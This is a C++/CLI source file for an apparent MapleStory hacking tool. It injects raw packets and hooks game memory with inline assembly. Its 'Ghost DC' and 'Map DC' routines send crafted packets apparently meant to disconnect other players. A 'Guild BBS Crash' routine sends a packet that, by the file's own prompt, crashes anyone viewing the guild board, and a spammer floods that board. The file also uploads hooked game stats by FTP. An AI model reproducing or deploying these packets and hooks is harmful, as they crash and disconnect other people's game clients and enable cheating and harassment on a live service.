#pragma warning( disable : 4945 4996 4793 4244)
#include "Form10.h"
#include "Form6.h"
#include "functions.h"
#include <Windows.h>
#include <string>
#include <time.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <algorithm>
#include <msclr\marshal_cppstd.h>
#include <vector>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <cstdlib> // rand()

using namespace Savionic;
using namespace std;
using namespace msclr::interop;
using System::Runtime::InteropServices::Marshal;

extern bool msSendPacket(string str);
extern void StringToChar(String^ str, char* buffer);
#pragma once
#pragma region KillMS
int KillMSDelayHour = 2;
int KillMSDelayMinute = 30;
int KillMSDelaySecond = 15;
int KillMSDelay;
bool KillOn;
void KillMapleStory()
{
	while(KillOn)
	{	
		KillMSDelayHour = (KillMSDelayHour*3600000);
		KillMSDelayMinute = (KillMSDelayMinute*60000);
		KillMSDelaySecond = (KillMSDelaySecond*1000);
		KillMSDelay = (KillMSDelayHour + KillMSDelayMinute + KillMSDelaySecond);
		Sleep(KillMSDelay);
		TerminateProcess(GetCurrentProcess(), 0);
	}
}
void Form10::textBox1_TextChanged(System::Object^  sender, System::EventArgs^  e)
{
}
void Form10::checkBox1_CheckedChanged(System::Object^  sender, System::EventArgs^  e)
{
	if(this->checkBox1->Checked) 
	{
		KillOn = !KillOn;
		if (KillOn)
		{
			KillMSDelayHour = Convert::ToInt32(this->textBox1->Text);
			KillMSDelayMinute = Convert::ToInt32(this->textBox6->Text);
			KillMSDelaySecond = Convert::ToInt32(this->textBox7->Text);
			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&KillMapleStory, NULL, NULL, NULL);
		}
	}
	else
	{
		KillOn = false;
	}
}
#pragma endregion
#pragma region All Chat Ghost DC
//Ghost DC
int GhostDCDelay = 100;
void Form10::button1_Click(System::Object^  sender, System::EventArgs^  e)
{
	GhostDCDelay = Convert::ToInt32(this->textBox3->Text);
	if(this->button1->Text == "All Chat Ghost DC [OFF]")
	{
		this->button1->Text = "All Chat Ghost DC [ON]";
		this->timer1->Interval = GhostDCDelay;
		this->timer1->Enabled = true;
	}
	else
	{
		this->button1->Text = "All Chat Ghost DC [OFF]";
		this->timer1->Enabled = false;
	}
}
void Form10::timer1_Tick(System::Object^  sender, System::EventArgs^  e)
{
	if(radioButton4->Checked == true)
	{
		msSendPacket("37 00 ** ** 29 01 46 00 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 00");
		msSendPacket("37 00 ** ** 29 01 46 00 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 47 61 6D 65 4B 69 6C 6C 65 72 20 40 40 40 40 40 40 40 00");
	}
	if(radioButton3->Checked == true)
	{
		msSendPacket("37 00 ** ** 29 01 46 00 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 00");
		msSendPacket("37 00 ** ** 29 01 46 00 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 00");
	}
}
#pragma endregion
#pragma region Guild BBS Spammer
int GuildBBSDelay = 100;
void Form10::button3_Click(System::Object^  sender, System::EventArgs^  e)
{
	GuildBBSDelay = Convert::ToInt32(this->textBox10->Text);
	if(this->button3->Text == "Guild BBS Spam [OFF]")
	{
		this->button3->Text = "Guild BBS Spam [ON]";
		this->timer3->Interval = GuildBBSDelay;
		this->timer3->Enabled = true;
	}
	else
	{
		this->button3->Text = "Guild BBS Spam [OFF]";
		this->timer3->Enabled = false;
	}
}

void Form10::timer3_Tick(System::Object^  sender, System::EventArgs^  e)
{
	char GuildBBSPacket[1024];

	//Convert Subject to Hex
	char SubjectToHex[1024];
	StringToChar((this->textBox2->Text), SubjectToHex);
	char SubBuffer[1024]="";
	char *pSubBuffer = SubBuffer;
	int len = strlen( SubjectToHex );
	int i;
	for(i = 0; i < len ;i++ )
	{
		sprintf(pSubBuffer, "%X", SubjectToHex[i]);
		pSubBuffer +=2;
	}
	//Get Sizeof Subject
	std::string SubSize(marshal_as<std::string>(textBox2->Text));
	int Sublen = SubSize.length();


	//Convert Message to Hex
		char MessageToHex[1024];
	StringToChar((this->textBox5->Text), MessageToHex);
	char Messagebuffer[1024]="";
	char *pMessagebuffer = Messagebuffer;
	int alen = strlen( MessageToHex );
	int a;
	for(a = 0; a < alen ;a++ )
	{
		sprintf(pMessagebuffer, "%X", MessageToHex[a]);
		pMessagebuffer +=2;
	}
	//Get Sizeof Message
	std::string MessageSize(marshal_as<std::string>(textBox5->Text));
	int Messagelen = MessageSize.length();



	sprintf(GuildBBSPacket, "B7 00 00 00 00 %.2X 00 %s %.2X 00 %s 00 00 00 00", Sublen, SubBuffer, Messagelen, Messagebuffer );
	msSendPacket(GuildBBSPacket);
	Sleep(100);
	msSendPacket("B7 00 02 00 00 00 00");
}
#pragma endregion
#pragma region Guild BBS Spam Remover
int GuildBBSRemDelay = 100;
void Form10::button8_Click(System::Object^  sender, System::EventArgs^  e)
{
	GuildBBSRemDelay = Convert::ToInt32(this->textBox10->Text);
	if(this->button3->Text == "Remove BBS Spam [OFF]")
	{
		this->button8->Text = "Remove BBS Spam [ON]";
		this->timer4->Interval = GuildBBSRemDelay;
		this->timer4->Enabled = true;
	}
	else
	{
		this->button8->Text = "Remove BBS Spam [OFF]";
		this->timer4->Enabled = false;
	}
}

void Form10::timer4_Tick(System::Object^  sender, System::EventArgs^  e)
{
	msSendPacket("B7 00 00 00 00 01 00 20 01 00 20 00 00 00 00");
}
#pragma endregion
#pragma region Guild BBS Crash
void Form10::button4_Click(System::Object^  sender, System::EventArgs^  e)
{
	int  nQuit1 = ::MessageBox(NULL, "Are you SURE you want to crash anyone who views the Guild BBS?",  "Seriously?!", MB_ICONEXCLAMATION|MB_YESNO); 
	if (nQuit1 == IDYES)
	{
		::MessageBox(NULL, "OHHH, you are one EVIL and cruel person!",  "EVILLLLLL!!", MB_ICONEXCLAMATION|MB_OK); 
		msSendPacket("B7 00 00 00 00 01 00 46 01 00 46 FE FF FF FF");
	}
}
#pragma endregion
#pragma region Map DC
//Map DC
int MapDCDelay = 100;

void Form10::timer2_Tick(System::Object^  sender, System::EventArgs^  e)
{
	if(radioButton1->Checked == true)
	{
		msSendPacket("37 00 ** ** 25 02 46 00 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 00");
		msSendPacket("37 00 ** ** 25 02 46 00 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 47 61 6D 65 4B 69 6C 6C 65 72 20 40 40 40 00");
	}
	if(radioButton2->Checked == true)
	{
		msSendPacket("37 00 ** ** 25 02 46 00 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 00");
		msSendPacket("37 00 ** ** 25 02 46 00 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 40 00");
	}
}
void Form10::button2_Click(System::Object^  sender, System::EventArgs^  e)
{
	MapDCDelay = Convert::ToInt32(textBox4->Text);
	if(this->button2->Text == "Map DC [OFF]")
	{
		this->button2->Text = "Map DC [ON]";
		this->timer2->Interval = MapDCDelay;
		this->timer2->Enabled = true;
	}
	else
	{
		this->button2->Text = "Map DC [OFF]";
		this->timer2->Enabled = false;
	}
}
#pragma endregion
#pragma region Converters
//Converter
char aConvert[2048]; 
int bConvert;
void Form10::button6_Click(System::Object^  sender, System::EventArgs^  e)
{
	bConvert = Convert::ToInt32(this->textBox8->Text);
	sprintf(aConvert, "%X", bConvert); 
	textBox9->Text = gcnew System::String(aConvert);
}

void Form10::button7_Click(System::Object^  sender, System::EventArgs^  e)
{
	char cConvert[1024];
	StringToChar((this->textBox12->Text), cConvert);
	char buffer[1024]="";
	char *pbuffer = buffer;
	int len = strlen( cConvert );
	int i;
	for(i = 0; i < len ;i++ )
	{
		sprintf(pbuffer, "%X", cConvert[i]);
		pbuffer +=2;
	}
	textBox11->Text = gcnew System::String(buffer);

}
#pragma endregion
#pragma region Upload function
/// <summary>
/// Methods to upload file to FTP Server
/// </summary>
/// <param name="_FileName">local source file name</param>
/// <param name="_UploadPath">Upload FTP path including Host name</param>
/// <param name="_FTPUser">FTP login username</param>
/// <param name="_FTPPass">FTP login password</param>
void UploadFile(System::String ^_FileName, System::String ^_UploadPath, System::String ^_FTPUser, System::String ^_FTPPass)
{
    System::IO::FileInfo ^_FileInfo = gcnew System::IO::FileInfo(_FileName);

    // Create FtpWebRequest object from the Uri provided
    System::Net::FtpWebRequest ^_FtpWebRequest = safe_cast<System::Net::FtpWebRequest^>(System::Net::FtpWebRequest::Create(gcnew Uri(_UploadPath)));

    // Provide the WebPermission Credintials
    _FtpWebRequest->Credentials = gcnew System::Net::NetworkCredential(_FTPUser, _FTPPass);

    // By default KeepAlive is true, where the control connection is not closed
    // after a command is executed.
    _FtpWebRequest->KeepAlive = false;

    // set timeout for 20 seconds
    _FtpWebRequest->Timeout = 20000;

    // Specify the command to be executed.
    _FtpWebRequest->Method = System::Net::WebRequestMethods::Ftp::UploadFile;

    // Specify the data transfer type.
    _FtpWebRequest->UseBinary = true;

    // Notify the server about the size of the uploaded file
    _FtpWebRequest->ContentLength = _FileInfo->Length;

    // The buffer size is set to 2kb
    int buffLength = 2048;
    array<System::Byte> ^buff = gcnew array<System::Byte>(buffLength);

    // Opens a file stream (System.IO.FileStream) to read the file to be uploaded
    System::IO::FileStream ^_FileStream = _FileInfo->OpenRead();

    try
    {
        // Stream to which the file to be upload is written
        System::IO::Stream ^_Stream = _FtpWebRequest->GetRequestStream();

        // Read from the file stream 2kb at a time
        int contentLen = _FileStream->Read(buff, 0, buffLength);

        // Till Stream content ends
        while (contentLen != 0)
        {
            // Write Content from the file stream to the FTP Upload Stream
            _Stream->Write(buff, 0, contentLen);
            contentLen = _FileStream->Read(buff, 0, buffLength);
        }

        // Close the file stream and the Request Stream
        _Stream->Close();
        delete _Stream;
        _FileStream->Close();
        delete _FileStream;
    }
    catch (Exception ^ex)
    {
        MessageBox::Show(ex->Message, "Upload Error", MessageBoxButtons::OK, MessageBoxIcon::Error);
    }
}
#pragma endregion
#pragma region Remote Viewing System
string randomStrGen(int length) {
    static string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    string result;
    result.resize(length);

    for (int i = 0; i < length; i++)
        result[i] = charset[rand() % charset.length()];

    return result;
}

/////////////////////////////////
/// Level Hook
/////////////////////////////////

unsigned long ulLevel1 = 0x00481167; //8D 0C 80 85 C9 74 27 8B 75 08 8B C6 6B C0 64 99
unsigned long ulLevelReturn1 = ulLevel1 + 5;
int CurLevel1 = 0;
void __declspec(naked) LevelHook1()
{
    __asm
	{
       jmp LevelHook
		LevelHook:
		mov byte ptr [CurLevel1],al
		ret
		jmp dword ptr [ulLevelReturn1]
    }
}
 
void HookLevel1(bool on) {
    if(on) {
        Jump(ulLevel1, LevelHook1, 0); //Create a jump from ulStat to the StatHook method
    } else {
        WriteMemory(ulLevel1,5,0xCC,0xCC,0xCC,0xCC,0xCC); //Write the bytes which were there before.               
    }
}

/////////////////////////////////
/// Stat Hook
/////////////////////////////////

unsigned long ulStat1 = 0x0089307F; //8D 0C 80 85 C9 74 27 8B 75 08 8B C6 6B C0 64 99
unsigned long ulStatReturn1 = ulStat1 + 5;

long int CurHP1 = 0, CurMP1 = 0,  MaxHP1 = 0, MaxMP1 = 0, CurEXP1 = 0, MaxEXP1 = 0;
 
void __declspec(naked) StatHook1() {
    __asm {
        push eax
            mov eax,[ebp+0x08]
        mov [CurHP1],eax
            mov eax,[ebp+0x0c]
        mov [MaxHP1],eax
            mov eax,[ebp+0x10]
        mov [CurMP1],eax
            mov eax,[ebp+0x14]
        mov [MaxMP1],eax
            mov eax,[ebp+0x18]
        mov [CurEXP1],eax
            mov eax,[ebp+0x1c]
        mov [MaxEXP1],eax
            pop eax
            lea ecx,[eax+eax*4]
        test ecx,ecx
            jmp [ulStatReturn1] //Notice that we use ulStatReturn instead of a fixed value
    }
}
 
void HookStat1(bool on) {
    if(on) {
        Jump(ulStat1, StatHook1, 0); //Create a jump from ulStat to the StatHook method
    } else {
        WriteMemory(ulStat1,5,0x8D,0x0C,0x80,0x85,0xC9); //Write the bytes which were there before.               
    }
}
void Form10::checkBox2_CheckedChanged(System::Object^  sender, System::EventArgs^  e)
{
	int RemoteDelayh = Convert::ToInt32(textBox17->Text),
		RemoteDelaym = Convert::ToInt32(textBox16->Text),
		RemoteDelays = Convert::ToInt32(textBox15->Text),
		RemoteDelayHour = (RemoteDelayh*3600000),
		RemoteDelayMin = (RemoteDelaym*60000),
		RemoteDelaySec = (RemoteDelays*1000),
		RemoteDelay = (RemoteDelayHour + RemoteDelayMin + RemoteDelaySec);

	if(checkBox2->Checked)
	{
		if(RemoteDelay < 300000)
		{
			::MessageBox(NULL,	"The saving interval can not be less than 5 minutes.",  "Error!", MB_OK | MB_ICONINFORMATION);
			RemoteViewTimer->Enabled = false;
			checkBox2->Checked = false;
		}
		else
		{
			RemoteViewTimer->Interval = RemoteDelay;
			RemoteViewTimer->Enabled = true;
			HookStat1(true);
			HookLevel1(true);
		}
	}
	else
	{
		RemoteViewTimer->Enabled = false;
		HookStat1(false);
		HookLevel1(false);
	}

}
void Form10::RemoteViewTimer_Tick(System::Object^  sender, System::EventArgs^  e)
{
					//Values:
#define dHealth CurHP1.ToString()
#define dMana CurMP1.ToString()
#define dBreath ReadPointer((ULONG_PTR*)CharBase, Breath).ToString()
#define dPID ReadPointer((ULONG_PTR*)CharBase, PID).ToString()
#define dCharAnim  ReadPointer((ULONG_PTR*)CharBase, Animation).ToString()
#define dCombo ReadPointer((ULONG_PTR*)CharBase, ComboCount).ToString()
#define dAttacks ReadPointer((ULONG_PTR*)CharBase, AttackCount).ToString()
#define dCurExp CurEXP1.ToString()
#define dMaxExp MaxEXP1.ToString()
#define dMapID ReadPointer((ULONG_PTR*)InfoBase, MapID).ToString()
#define dCharX ((short signed int)ReadPointer((ULONG_PTR*)CharBase, Charx)-1).ToString()
#define dCharY ((short signed int)ReadPointer((ULONG_PTR*)CharBase, Chary)-1).ToString()
#define dMonsters ReadPointer((ULONG_PTR*)MonsterBase, MobCount).ToString()
#define dMobX ((short signed int)(MobX)).ToString()
#define dMobY ((short signed int)(MobY)).ToString()
#define dPeople ReadPointer((ULONG_PTR*)PeopleBase, PeopleCount).ToString()
#define dItems ReadPointer((ULONG_PTR*)ItemBase, ItemCount).ToString()
#define dMouseX ((short signed int)(MouseX)).ToString()
#define dMouseY ((short signed int)(MouseY)).ToString()
#define dMouseAnim ReadPointer((ULONG_PTR*)MouseBase, MouseAnim).ToString()
#define dPortals ReadPointer((ULONG_PTR*)PortalBase, PortalCount).ToString()
#define dChnnl (ReadPointer((ULONG_PTR*)ServerBase, Channel)+1).ToString() 
#define dCurLevel1 CurLevel1.ToString()
#define dIngameName ReadPointer((ULONG_PTR*)NameBase, NameOffset).ToString()
	/*Decalres variables that will go into the textfile*/
	char cHealth[100],
		 cMana[100],
		 cCurExp[100],
		 cMaxExp[100],
		 cChnnl[100],
		 cAttacks[100],
		 cBreath[100],
		 cMapID[100],
		 cCharX[100],
		 cCharY[100],
		 cMonsters[100],
		 cPeople[100],
		 cItems[100],
		 cPortals[100],
		 cCurLevel1[100],
		 cIngameName[100];

	/*Converts variables from string to char*/
	StringToChar(dHealth, cHealth);
	StringToChar(dMana, cMana);
	StringToChar(dCurExp, cCurExp);
	StringToChar(dMaxExp, cMaxExp);
	StringToChar(dChnnl, cChnnl);
	StringToChar(dAttacks, cAttacks);
	StringToChar(dBreath, cBreath);
	StringToChar(dMapID, cMapID);
	StringToChar(dCharX, cCharX);
	StringToChar(dCharY, cCharY);
	StringToChar(dMonsters, cMonsters);
	StringToChar(dPeople, cPeople);
	StringToChar(dItems, cItems);
	StringToChar(dPortals, cPortals);
	StringToChar(dCurLevel1, cCurLevel1);
	StringToChar(dIngameName, cIngameName);
	/* Time */
	 char *date;
     time_t timer;
     timer=time(NULL);   
     date = asctime(localtime(&timer));
	if(radioButton5->Checked == true) // FULL
	{
			/*Gets the current desktop path and the file path.*/
		char OutputPath[MAX_PATH];
		BOOL ret = ::SHGetSpecialFolderPath(0, OutputPath, CSIDL_DESKTOPDIRECTORY, FALSE);
		string DesktopPath(OutputPath);
		string LolPath(marshal_as<std::string>(textBox13->Text));
		string SavePath = "\\" + LolPath + ".html";
		DesktopPath += SavePath;
		ofstream outfile(DesktopPath);

		/*outputs the following into the text file*/      
		outfile << "<html>" << endl;
		outfile << "<head>" << endl;
		outfile << "<title>" << endl << "Savionic's Remote Viewing Sytstem - TylerCode" << endl << "</title>" << endl;
		outfile << "</head>" << endl;
		outfile << "<body> <center>" << endl;
		outfile << endl << "<br> <br>" << endl << "Welcome to Savionic's remote viewing system!" << endl << "<br>" << endl;
		outfile << "<a href=\"http://www.TylerCode.com\">Homepage of TylerCode</a>" << endl << "<br>" << endl;
		outfile << "File uploaded: " << LolPath << ".html" << endl << "<br>" << endl;
		outfile << "Date uploaded: " << date << endl << "<br> <br>" << endl;
		outfile << "<b>Character Information</b>" << endl << "<br>" << endl;
		//outfile << "Character Name: " << cIngameName << endl << "<br>" << endl;
		outfile << "Level: " << cCurLevel1 << endl << "<br>" << endl;
		outfile << "Health: " << cHealth << endl << "<br>" << endl;
		outfile << "Mana: " << cMana << endl << "<br>" << endl;
		outfile << "Exp: " << cCurExp << " / " << cMaxExp << endl << "<br>" << endl;
		outfile << "Channel: " << cChnnl << endl << "<br>" << endl;
		outfile << "Character Location: " << cCharX << "," << cCharY << endl << "<br>" << endl;
		outfile << "Attacks: " << cAttacks << endl << "<br>" << endl;
		outfile << "Breath: " << cBreath << endl << "<br> <br>" << endl;

		outfile << "<b>Map Information</b>" << endl << "<br>" << endl;
		outfile << "Map ID: " << cMapID << endl << "<br>" << endl;
		outfile << "Monsters: " << cMonsters << endl << "<br>" << endl;
		outfile << "People: " << cPeople << endl << "<br>" << endl;
		outfile << "Items: " << cItems << endl << "<br>" << endl;
		outfile << "Portals: " << cPortals << endl;
		outfile << " </center> </body>" << endl;
		outfile << "</html>" << endl;
		outfile.close();
		// Upload file using FTP
		String^ DesktopPathFTP = gcnew String(DesktopPath.c_str());

		UploadFile(DesktopPathFTP, "FULL Ftp Directory you want the file in. " + /*File name*/textBox13->Text + ".html", "ftp user", "ftp pass");

		textBox14->Text = "URLLink you want to be displayed. " + textBox13->Text + ".html";
		linkLabel1->Visible = true;
	}

	if(radioButton6->Checked == true) // MOBILE
	{
			/*Gets the current desktop path and the file path.*/
		char OutputPath[MAX_PATH];
		BOOL ret = ::SHGetSpecialFolderPath(0, OutputPath, CSIDL_DESKTOPDIRECTORY, FALSE);
		string DesktopPath(OutputPath);
		string LolPath(marshal_as<std::string>(textBox13->Text));
		string SavePath = "\\" + LolPath + ".txt";
		DesktopPath += SavePath;
		ofstream outfile(DesktopPath);

			/*outputs the following into the text file*/      
		outfile << endl << endl << "Welcome to Savionic's Mobile Remote Viewing System!" << endl;
		outfile << "File uploaded: " << LolPath << ".txt" << endl;
		outfile << "Date uploaded: " << date << endl << endl;
		outfile << "Char Information" << endl;
		//outfile << "Char Name: " << cIngameName << endl;
		outfile << "Lvl: " << cCurLevel1 << endl;
		outfile << "HP: " << cHealth << endl;
		outfile << "MP: " << cMana << endl;
		outfile << "Exp: " << cCurExp << " / " << cMaxExp << endl;
		outfile << "Ch: " << cChnnl << endl;
		outfile << "Char Coords: " << cCharX << "," << cCharY << endl;
		outfile << "Atks: " << cAttacks << endl;
		outfile << "Breath: " << cBreath << endl << endl;

		outfile << "Map Information" << endl;
		outfile << "Map ID: " << cMapID << endl;
		outfile << "Mobs: " << cMonsters << endl;
		outfile << "People: " << cPeople << endl;
		outfile << "Items: " << cItems << endl;
		outfile << "Portals: " << cPortals << endl;
		outfile.close();

		// Upload file using FTP
		String^ DesktopPathFTP = gcnew String(DesktopPath.c_str());
		UploadFile(DesktopPathFTP, "MOBILE FTP Directory you want the file in." + textBox13->Text + ".txt", "ftp user", "ftp pass");
		textBox14->Text = "URL Link you want displayed." + textBox13->Text + ".txt";
		linkLabel1->Visible = true;
	}

}


void Form10::button5_Click(System::Object^  sender, System::EventArgs^  e)
{
	srand(time(NULL));
	string sFileName = randomStrGen(10);
	String^ ssFileName = gcnew String(sFileName.c_str());
	textBox13->Text = ssFileName;
}

void Form10::linkLabel1_LinkClicked(System::Object^  sender, System::Windows::Forms::LinkLabelLinkClickedEventArgs^  e)
{
	char buffer2[512];
	sprintf(buffer2, "%s", textBox14->Text);
	ShellExecuteA(NULL, "open", buffer2, NULL, NULL, SW_SHOWNORMAL);
}

#pragma endregion
#pragma region PANEL BUTTONs
void Form10::button9_Click(System::Object^  sender, System::EventArgs^  e)
{
	this->panel1->Visible = true;
	this->panel2->Visible = false;
	this->panel3->Visible = false;
	this->panel4->Visible = false;
}
void Form10::button11_Click(System::Object^  sender, System::EventArgs^  e)
{
	this->panel1->Visible = false;
	this->panel2->Visible = true;
	this->panel3->Visible = false;
	this->panel4->Visible = false;
}
void Form10::button10_Click(System::Object^  sender, System::EventArgs^  e)
{
	this->panel1->Visible = false;
	this->panel2->Visible = false;
	this->panel3->Visible = true;
	this->panel4->Visible = false;
}
void Form10::button12_Click(System::Object^  sender, System::EventArgs^  e)
{
	this->panel1->Visible = false;
	this->panel2->Visible = false;
	this->panel3->Visible = false;
	this->panel4->Visible = true;
}
#pragma endregion
#pragma region Quick Slot

void Form10::checkBox3_CheckedChanged(System::Object^  sender, System::EventArgs^  e) // Quickslot enable
{
	//Never fully implemented.
}
void Form10::checkBox4_CheckedChanged(System::Object^  sender, System::EventArgs^  e) // Shift
{
	if(checkBox3->Checked == true)
	{
		if(checkBox4->Checked == true)
		{
			int ShiftQTY = ReadPointer((ULONG_PTR*)QuickSlotBase, QSShift);
			if(ShiftQTY == 0)
			{
				TerminateProcess(GetCurrentProcess(), 0);
			}
		}
	}
	else
	{
		::MessageBox(NULL, "You need to first check the \"Exit when out of potions:\" Check box!",  "Error!", MB_ICONEXCLAMATION|MB_OK); 
		checkBox4->Checked = false;
	}
}
void Form10::checkBox11_CheckedChanged(System::Object^  sender, System::EventArgs^  e) // Insert
{
	if(checkBox3->Checked == true)
	{
		if(checkBox11->Checked == true)
		{
			int InsertQTY = ReadPointer((ULONG_PTR*)QuickSlotBase, QSInsert);
			if(InsertQTY == 0)
			{
				TerminateProcess(GetCurrentProcess(), 0);
			}
		}
	}
	else
	{
		::MessageBox(NULL, "You need to first check the \"Exit when out of potions:\" Check box!",  "Error!", MB_ICONEXCLAMATION|MB_OK); 
		checkBox11->Checked = false;
	}
}
void Form10::checkBox10_CheckedChanged(System::Object^  sender, System::EventArgs^  e) // Home
{
	if(checkBox3->Checked == true)
	{
		if(checkBox10->Checked == true)
		{
			int HomeQTY = ReadPointer((ULONG_PTR*)QuickSlotBase, QSHome);
			if(HomeQTY == 0)
			{
				TerminateProcess(GetCurrentProcess(), 0);
			}
		}
	}
	else
	{
		::MessageBox(NULL, "You need to first check the \"Exit when out of potions:\" Check box!",  "Error!", MB_ICONEXCLAMATION|MB_OK); 
		checkBox10->Checked = false;
	}
}
void Form10::checkBox9_CheckedChanged(System::Object^  sender, System::EventArgs^  e) // Page Up
{
	if(checkBox3->Checked == true)
	{
		if(checkBox9->Checked == true)
		{
			int PgUpQTY = ReadPointer((ULONG_PTR*)QuickSlotBase, QSPgUp);
			if(PgUpQTY == 0)
			{
				TerminateProcess(GetCurrentProcess(), 0);
			}
		}
	}
	else
	{
		::MessageBox(NULL, "You need to first check the \"Exit when out of potions:\" Check box!",  "Error!", MB_ICONEXCLAMATION|MB_OK); 
		checkBox9->Checked = false;
	}
}
void Form10::checkBox8_CheckedChanged(System::Object^  sender, System::EventArgs^  e) //Control
{
	if(checkBox3->Checked == true)
	{
		if(checkBox8->Checked == true)
		{
			int CtrlQTY = ReadPointer((ULONG_PTR*)QuickSlotBase, QSCtrl);
			if(CtrlQTY == 0)
			{
				TerminateProcess(GetCurrentProcess(), 0);
			}
		}
	}
	else
	{
		::MessageBox(NULL, "You need to first check the \"Exit when out of potions:\" Check box!",  "Error!", MB_ICONEXCLAMATION|MB_OK); 
		checkBox8->Checked = false;
	}
}
void Form10::checkBox7_CheckedChanged(System::Object^  sender, System::EventArgs^  e) // Delete
{
	if(checkBox3->Checked == true)
	{
		if(checkBox7->Checked == true)
		{
			int DelQTY = ReadPointer((ULONG_PTR*)QuickSlotBase, QSDel);
			if(DelQTY == 0)
			{
				TerminateProcess(GetCurrentProcess(), 0);
			}
		}
	}
	else
	{
		::MessageBox(NULL, "You need to first check the \"Exit when out of potions:\" Check box!",  "Error!", MB_ICONEXCLAMATION|MB_OK); 
		checkBox7->Checked = false;
	}
}
void Form10::checkBox6_CheckedChanged(System::Object^  sender, System::EventArgs^  e) // End
{
	if(checkBox3->Checked == true)
	{
		if(checkBox6->Checked == true)
		{
			int EndQTY = ReadPointer((ULONG_PTR*)QuickSlotBase, QSEnd);
			if(EndQTY == 0)
			{
				TerminateProcess(GetCurrentProcess(), 0);
			}
		}
	}
	else
	{
		::MessageBox(NULL, "You need to first check the \"Exit when out of potions:\" Check box!",  "Error!", MB_ICONEXCLAMATION|MB_OK); 
		checkBox6->Checked = false;
	}
}
void Form10::checkBox5_CheckedChanged(System::Object^  sender, System::EventArgs^  e) // Page Down
{
	if(checkBox3->Checked == true)
	{
		if(checkBox5->Checked == true)
		{
			int PgDwnQTY = ReadPointer((ULONG_PTR*)QuickSlotBase, QSPgDwn);
			if(PgDwnQTY == 0)
			{
				TerminateProcess(GetCurrentProcess(), 0);
			}
		}
	}
	else
	{
		::MessageBox(NULL, "You need to first check the \"Exit when out of potions:\" Check box!",  "Error!", MB_ICONEXCLAMATION|MB_OK); 
		checkBox5->Checked = false;
	}
}

void Form10::QuickSlotTimer_Tick(System::Object^  sender, System::EventArgs^  e)
{
	#define MapID (ReadPointer((ULONG_PTR*)InfoBase, MapID))
	#define RP( X )  (ReadPointer((ULONG_PTR*)QuickSlotBase, X))
	if(MapID != 0)
	{
		label23->Text = RP(QSShift).ToString();
		label24->Text = RP(QSCtrl).ToString();
		label25->Text = RP(QSDel).ToString();
		label26->Text = RP(QSInsert).ToString();
		label27->Text = RP(QSEnd).ToString();
		label28->Text = RP(QSHome).ToString();
		label29->Text = RP(QSPgDwn).ToString();
		label30->Text = RP(QSPgUp).ToString();
	}
}
#pragma endregion
#pragma region Level Terminate
void Form10::checkBox12_CheckedChanged(System::Object^  sender, System::EventArgs^  e) // Level
{
	if(checkBox12->Checked == true)
	{
		int ExitAtLevel = Convert::ToInt32(textBox18->Text);
		HookLevel1(true);
		if(( ExitAtLevel != 0) && (ExitAtLevel <= CurLevel1))
		{
			TerminateProcess(GetCurrentProcess(), 0);
		}
	}
	else
	{
		HookLevel1(false);
	}
}
#pragma endregion